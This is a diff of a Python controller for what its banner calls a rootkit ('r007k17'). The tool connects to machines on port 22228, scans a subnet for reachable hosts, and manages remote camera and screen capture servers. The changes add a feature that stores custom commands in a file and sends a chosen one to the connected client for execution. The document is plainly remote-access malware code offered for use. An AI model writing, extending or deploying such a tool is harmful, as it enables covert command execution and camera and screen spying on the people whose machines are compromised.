@@ -23,6 +23,7 @@ def Ip(data, ipmodify="0"):
             ipyou.write(ipmodify)
             ipyou.close()
             ipHost = Ip("return")
+            clear()
             restart()
             return True
         else:
@@ -49,17 +50,19 @@ def restart():
     ipToConnect = str()
     ipHost = Ip("return")
     port = 22228
-    os.system('cls' if os.name == 'nt' else 'clear')
     print("###################################"+"                                                          connect to "+ipHost)
     print("##### r007k17 by 7r1574n n13l #####")
     print("###################################"+"                                                          port "+str(port))
 def starting():
+    clear()
     restart()
     ret = None
     if ipHost == "nothing":
         while ret != True:
             ret = Ip("modify", input("write your ip : "))
 
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 def help(data):
     if data == "command":
         ligne = None
@@ -94,7 +97,7 @@ def testAll(speed=0.3, other=None):
     else:
         other=["temp"]
     if speed == True:
-        speed = 0.08
+        speed = 0.1
     ipHostList.pop(len(ipHostList)-1)
     ipHostList = ".".join(ipHostList)
     for f in range(len(other)):
@@ -111,6 +114,7 @@ def testAll(speed=0.3, other=None):
                 time.sleep(8)
                 listIpAvailable.append(ipHostList+three+"."+str(i))
                 sendData("left")
+                time.sleep(1)
                 try:
                     camera.stop_server()
                     screen.stop_server()
@@ -122,11 +126,64 @@ def testAll(speed=0.3, other=None):
     else:
         print("il n'y a aucune ip disponible")
     command(input(">"))
-            
+
+def testEmptyLine(nameFile):
+    numberLine = (len((open(nameFile,'r')).readlines()))
+    file = (open(nameFile, 'r'))
+    ligne = 0
+    numbsup = 0
+    lignesup = []
+    for i in range(numberLine):
+        readln = file.readline()
+        ligne = ligne + 1 
+        if readln == "\n":
+            lignesup.append(ligne)
+            numbsup += 1
+    lignesup.sort(reverse=True)
+    for i in range(numbsup):
+        supLine(nameFile, lignesup[i])
+    file.close()
+
+def supLine(filename, line_to_delete):
+    initial_line = 1
+    file_lines = {}
+    with open(filename) as f:
+        content = f.readlines() 
+    for line in content:
+        file_lines[initial_line] = line.strip()
+        initial_line += 1
+    f = open(filename, "w")
+    for line_number, line_content in file_lines.items():
+        if line_number != line_to_delete:
+            f.write('{}\n'.format(line_content))
+    f.close()
+    
+def printFileCmd():
+    filename = "cmd.txt"
+    testEmptyLine(filename)
+    with open(filename) as fp:
+       line = fp.readline()
+       cnt = 1
+       while line:
+           print("Line {}: {}".format(cnt, line.strip()))
+           line = fp.readline()
+           cnt += 1
+    fp.close()
+
+def retLineCmd(filename, numberline):
+    with open(filename) as fp:
+       line = fp.readline()
+       cnt = 1
+       while line:
+            if cnt == numberline:
+                return("{}".format(line.strip()))
+            line = fp.readline()
+            cnt += 1
+    
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
-    global ipToConnect, ip
+    global ipToConnect, ip, run
     try:
         if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
             if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
@@ -156,12 +213,13 @@ def command(commandToExecute):
                 print("no ip write")
                 command(input(">"))
         elif commandToExecute in ("clear", "cleared", "cls", "restart"):
+            clear()
             restart()
             command(input(">"))
         elif commandToExecuteList[0] in ("testall", "testAll"):
             if len(commandToExecuteList) > 2:
                 if commandToExecuteList[len(commandToExecuteList)-1] in ("speed", "spd"):
-                    testAll(speed=True, other=commandToExecuteList[1])
+                    testAll(speed=0.25, other=commandToExecuteList[1])
                 else:
                     print("syntax error")
             elif len(commandToExecuteList) > 1:
@@ -171,12 +229,63 @@ def command(commandToExecute):
                     testAll(other=commandToExecuteList[1])
             else:
                 testAll()
+        elif commandToExecuteList[0] in ("cmd"):
+            try:
+                temp = run
+            except:
+                temp = True
+            run = True
+            clear()
+            print("your in the cmd space")
+            while run == True:
+                registreCmdAcces(input(">"))
+            run = temp
+            clear()
+            restart()
+            command(input(">"))
         else:
             print("Error")
             command(input(">"))
     except:
-        print("error")
         command(input(">"))
+
+def registreCmdAcces(data):
+    global run
+    data = stopSpaceError(data)
+    dataList = data.split()
+    try:
+        if dataList[0] in ("registre", "enregistre"):
+            customcmd = open("cmd.txt", "a")
+            temp = "\n"+" ".join(dataList[1:len(dataList)])
+            customcmd.write(temp)
+            customcmd.close()
+            registreCmdAcces(input(">"))
+        elif data in ("cmdList", "commandlist", "listcmd", "listcommand", "list"):
+            try:
+                printFileCmd()
+            except:
+                print("no cmd registre")
+                print("to registre a cmd write registre (and enter your cmd here)")
+            registreCmdAcces(input(">"))
+        elif data in ("clear", "cls"):
+            clear()
+            print("your in the cmd space")
+        elif data in ("back"):
+            run = False
+        elif dataList[0] in ("sup", "del"):
+            if len(dataList) > 2 and dataList[2].isdigit() == True:
+                dataList[2] = int(dataList[2])
+                supLine("cmd.txt", dataList[2])
+            elif len(dataList) > 1 and dataList[1].isdigit() == True:
+                dataList[1] = int(dataList[1])
+                supLine("cmd.txt", dataList[1])
+            else:
+                print("no int write")
+        else:
+            print("Error")
+            registreCmdAcces(input(">"))
+    except:
+        registreCmdAcces(input(">"))
     
 def sendData(data):
     global run
@@ -190,6 +299,28 @@ def sendData(data):
             run = False
         elif data in ("help", "aide"):
             help("sending")
+        elif data in ("cmd"):
+            try:
+                temp = run
+            except:
+                temp = True
+            run = True
+            clear()
+            print("your in the cmd space")
+            while run == True:
+                registreCmdAcces(input(">"))
+            run = temp
+            clear()
+            restart()
+        elif datalist[0] in ("cmd"):
+            if len(datalist) > 2 and datalist[2].isdigit() == True:
+                datalist[2] = int(datalist[2])
+                client.send((retLineCmd("cmd.txt", datalist[2])).encode())
+            elif len(datalist) > 1 and datalist[1].isdigit() == True:
+                datalist[1] = int(datalist[1])
+                client.send((retLineCmd("cmd.txt", datalist[1])).encode())
+            else:
+                print("no int write")
         elif data in ("left", "quit", "restart"):
             try:
                 client.send("left".encode())
@@ -302,13 +433,13 @@ while progrun == True:
         except:
             dataToSend = "left"
         sendData(dataToSend)
-    if server == True:
-        try:
+    try:
+        if server == True:
             camera.stop_server()
             screen.stop_server()
             server = False
-        except:
-            pass
+    except:
+        pass
 print("prog stop")
 time.sleep(0.5)
 exit()
